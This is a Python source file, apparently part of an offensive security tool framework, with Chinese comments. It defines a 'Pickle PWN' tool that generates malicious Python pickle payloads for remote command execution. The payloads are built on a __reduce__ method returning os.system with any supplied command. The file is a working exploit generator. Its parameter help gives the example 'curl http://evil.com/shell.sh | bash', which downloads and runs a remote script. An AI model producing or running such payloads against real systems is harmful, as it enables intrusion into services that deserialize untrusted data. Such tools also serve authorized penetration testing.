# tools/pickle_pwn_tool.py
# Pickle PWN - Python Pickle 反序列化利用
import json
from typing import Dict, Any
from tool_framework import CommandLineTool


class PicklePwnTool(CommandLineTool):
    """
    Pickle PWN 封装 - Python Pickle 反序列化漏洞利用工具
    生成恶意 Pickle Payload 实现 RCE
    """

    def __init__(self):
        super().__init__("pickle-pwn")
        self.timeout = 30

    def name(self) -> str:
        return "pickle-pwn"

    def description(self) -> str:
        return "Python Pickle 反序列化 Payload 生成器，实现远程命令执行"

    def supported_vulns(self) -> list:
        return ["Python Deserialization", "Pickle RCE", "Insecure Deserialization"]

    def check_available(self) -> bool:
        # 只依赖 Python 内置 pickle 模块，始终可用
        import pickle
        return True

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "command": {
                "type": "str",
                "description": "要执行的命令，如 'curl http://evil.com/shell.sh | bash'",
                "required": True
            },
            "protocol": {
                "type": "int",
                "description": "Pickle 协议版本 (0-5)，默认使用最高版本",
                "required": False,
                "default": None
            },
            "encode": {
                "type": "str",
                "description": "编码格式: base64, hex, raw (默认 raw)",
                "required": False,
                "default": "raw"
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        command = params.get("command")
        if not command:
            raise ValueError("必须提供 command 参数")

        try:
            import pickle
            import base64
            import os

            # 构建 RCE Payload
            class RCE:
                def __reduce__(self):
                    import os
                    return (os.system, (command,))

            # 序列化
            protocol = params.get("protocol")
            if protocol is None:
                protocol = pickle.HIGHEST_PROTOCOL

            payload_bytes = pickle.dumps(RCE(), protocol=protocol)

            # 编码处理
            encode = params.get("encode", "raw")
            if encode == "base64":
                payload_str = base64.b64encode(payload_bytes).decode()
            elif encode == "hex":
                payload_str = payload_bytes.hex()
            else:
                payload_str = payload_bytes.decode('latin-1')

            result = {
                "success": True,
                "vulnerable": True,
                "command": command,
                "protocol": protocol,
                "encoding": encode,
                "payload": payload_str,
                "payload_length": len(payload_bytes),
                "summary": f"生成 Pickle RCE Payload 成功，命令: {command}"
            }

            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }